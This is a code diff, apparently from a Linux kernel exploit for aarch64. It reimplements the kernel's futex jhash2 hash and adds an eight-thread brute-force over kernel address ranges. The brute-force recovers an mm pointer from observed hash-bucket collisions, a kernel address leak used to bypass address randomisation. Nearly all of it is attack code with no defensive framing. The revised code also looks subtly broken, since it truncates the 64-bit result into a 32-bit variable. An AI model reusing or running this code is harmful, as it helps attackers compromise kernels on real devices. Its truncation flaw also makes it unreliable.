@@ -128,80 +128,69 @@ static inline uint32_t ks_rol(uint32_t x, unsigned s) {
 
 static uint32_t g_hash_len = 4, g_hash_seed = 0xdeadbeefu, g_hash_mask = 0x7ffu;
 
-static inline uint32_t ks_hash(uintptr_t addr, uint32_t mm) {
-    /* 64-bit jhash2 with 4 words (aarch64 kernel futex):
-     *   k[0] = low32(page-aligned word)
-     *   k[1] = high32(page-aligned word)
-     *   k[2] = low32(mm pointer)
-     *   k[3] = high32(mm pointer) -- assume 0 for physical mm addresses
-     *   initval = word & (PAGE_SIZE - 1)
-     */
-    uint32_t page_lo = (uint32_t)(addr & ~(uintptr_t)(KS_PAGE - 1));
-    uint32_t page_hi = (uint32_t)((uint64_t)(addr & ~(uintptr_t)(KS_PAGE - 1)) >> 32);
-    uint32_t off     = (uint32_t)(addr & (KS_PAGE - 1));
-    uint32_t mm_lo   = mm;
-    uint32_t mm_hi   = 0;
+// --- 64-bit jhash2 (4 words), matching kernel/futex.c on aarch64 ---
+static inline uint32_t ks_hash(uint64_t mm, uintptr_t addr) {
+    uint32_t w[4];
+    w[0] = (uint32_t)(addr & 0xffffffffu);          // futex word low
+    w[1] = (uint32_t)((uint64_t)addr >> 32);        // futex word high
+    w[2] = (uint32_t)(mm & 0xffffffffu);            // mm low
+    w[3] = (uint32_t)(mm >> 32);                    // mm high
 
-    uint32_t a, b, c;
-    a = b = c = 0xdeadbeefu + (4u << 2) + off;
-
-    /* __jhash_mix (3 rounds, applied after k[0..2]) */
-    a += page_lo;
-    b += page_hi;
-    c += mm_lo;
-    a -= c;  a ^= ks_rol(c, 4);   c += b;
-    b -= a;  b ^= ks_rol(a, 6);   a += c;
-    c -= b;  c ^= ks_rol(b, 8);   b += a;
-    a -= c;  a ^= ks_rol(c, 16);  c += b;
-    b -= a;  b ^= ks_rol(a, 19);  a += c;
-    c -= b;  c ^= ks_rol(b, 4);   b += a;
-
-    /* k[3] then __jhash_final */
-    a += mm_hi;
-    c ^= b;  c -= ks_rol(b, 14);
-    a ^= c;  a -= ks_rol(c, 11);
-    b ^= a;  b -= ks_rol(a, 25);
-    c ^= b;  c -= ks_rol(b, 16);
-    a ^= c;  a -= ks_rol(c, 4);
-    b ^= a;  b -= ks_rol(a, 14);
-    c ^= b;  c -= ks_rol(b, 24);
-
+    uint32_t a = 0xdeadbeefu + 16u + (uint32_t)(addr & (KS_PAGE - 1));
+    uint32_t b = a, c = a;
+    a += w[0]; b += w[1]; c += w[2];
+    /* __jhash_mix */
+    a -= c; a ^= ks_rol(c, 4);  c += b;
+    b -= a; b ^= ks_rol(a, 6);  a += c;
+    c -= b; c ^= ks_rol(b, 8);  b += a;
+    a -= c; a ^= ks_rol(c, 16); c += b;
+    b -= a; b ^= ks_rol(a, 19); a += c;
+    c -= b; c ^= ks_rol(b, 4);  b += a;
+    a += w[3];
+    /* __jhash_final */
+    c ^= b; c -= ks_rol(b, 14);
+    a ^= c; a -= ks_rol(c, 11);
+    b ^= a; b -= ks_rol(a, 25);
+    c ^= b; c -= ks_rol(b, 16);
+    a ^= c; a -= ks_rol(c, 4);
+    b ^= a; b -= ks_rol(a, 14);
+    c ^= b; c -= ks_rol(b, 24);
     return c & g_hash_mask;
 }
 
 struct ks_brute {
-    uint32_t start, end;
+    uint64_t start, end;
     volatile uint32_t *found;
 };
+
 static void *ks_brute_thread(void *opaque) {
     struct ks_brute *x = opaque;
-    for (uint32_t mm = x->start; mm < x->end && !*x->found; mm += 4) {
-        uint32_t h = ks_hash(ks_state->target, mm);
-        if (ks_hash(ks_state->hits[0], mm) != h)
-            continue;
-        if (ks_hash(ks_state->hits[1], mm) != h)
-            continue;
-        if (ks_hash(ks_state->hits[2], mm) != h)
-            continue;
-        if (ks_hash(ks_state->hits[3], mm) != h)
-            continue;
-        __sync_bool_compare_and_swap(x->found, 0, mm);
-        break;
+    for (uint64_t mm = x->start; mm < x->end && !*x->found; mm += 8) {
+        uint32_t h = ks_hash(mm, ks_state->target);
+        int ok = 1;
+        for (unsigned i = 0; i < 4 && ok; i++)
+            if (ks_hash(mm, ks_state->hits[i]) != h) ok = 0;
+        if (ok) __sync_bool_compare_and_swap(x->found, 0, (uint32_t)mm);
     }
     return 0;
 }
 
 static uint32_t ks_solve_mm(void) {
     volatile uint32_t found = 0;
-    pthread_t tids[4];
-    struct ks_brute args[4];
-    for (unsigned i = 0; i < 4; i++) {
-        args[i].start = 0xc0000000u + i * 0x0c000000u;
-        args[i].end = args[i].start + 0x0c000000u;
+    pthread_t tids[8];
+    struct ks_brute args[8];
+    const uint64_t begin = 0xffffff8000000000ULL;
+    const uint64_t end   = 0xffffff9000000000ULL;
+    const uint64_t step  = 8;                       // 8-byte alignment
+    const uint64_t per   = (end - begin) / 8;
+
+    for (unsigned i = 0; i < 8; i++) {
+        args[i].start = begin + i * per;
+        args[i].end   = (i == 7) ? end : begin + (i + 1) * per;
         args[i].found = &found;
         pthread_create(&tids[i], 0, ks_brute_thread, &args[i]);
     }
-    for (unsigned i = 0; i < 4; i++)
+    for (unsigned i = 0; i < 8; i++)
         pthread_join(tids[i], 0);
     return found;
 }
